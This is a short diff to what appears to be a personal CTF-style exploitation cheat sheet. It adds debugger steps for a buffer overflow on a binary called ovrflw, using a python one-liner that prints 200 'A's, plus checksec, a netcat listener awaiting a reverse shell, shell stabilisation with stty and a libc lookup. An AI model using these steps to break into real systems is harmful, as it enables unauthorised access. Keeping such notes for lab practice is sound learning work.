@@ -47,10 +47,22 @@ exploit
 
 * r \(run\)
 
-* ```r``python -c 'print "A"\*200'\`\`\`
+* ```r``python -c 'print "A"\*200'\`\`\` \(buffer overflow\)
 
 * c \(continue\)
 
-* 
+* you will see an error after `c`
+
+* `python -c 'print "\x41"' (will print A)`
+
+* checksec
+
+Alternative
+
+* nc -lvnp 888 \(port set on the reverse shell script\)
+* stty raw -echo
+* nc -lvnp 888
+* ldd ovrflw \|grep libc
+
 
 
